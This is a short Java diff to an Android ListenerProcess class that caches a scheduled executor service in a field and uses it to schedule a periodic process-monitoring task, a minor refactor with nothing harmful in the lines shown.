@@ -11,6 +11,7 @@ package com.android.deviceinfo.listener;
 
 import java.util.ArrayList;
 import java.util.TreeMap;
+import java.util.concurrent.ScheduledExecutorService;
 import java.util.concurrent.ScheduledFuture;
 import java.util.concurrent.TimeUnit;
 
@@ -21,6 +22,7 @@ import com.android.deviceinfo.ProcessInfo;
 import com.android.deviceinfo.ProcessStatus;
 import com.android.deviceinfo.RunningProcesses;
 import com.android.deviceinfo.Standby;
+import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.interfaces.Observer;
 import com.android.deviceinfo.util.Check;
@@ -42,6 +44,7 @@ public class ListenerProcess extends Listener<ProcessInfo> implements Observer<S
 	/** The singleton. */
 	private volatile static ListenerProcess singleton;
 	private ScheduledFuture<?> future;
+	private ScheduledExecutorService stpe = Status.getStpe();
 
 	/**
 	 * Self.
@@ -80,7 +83,7 @@ public class ListenerProcess extends Listener<ProcessInfo> implements Observer<S
 					}
 
 					started = true;
-					this.future = Status.getStpe().scheduleAtFixedRate(bmp, this.PERIOD, this.PERIOD, TimeUnit.MILLISECONDS);
+					this.future = stpe.scheduleAtFixedRate(bmp, this.PERIOD, this.PERIOD, TimeUnit.MILLISECONDS);
 
 				}else{
 					if (Cfg.DEBUG) {
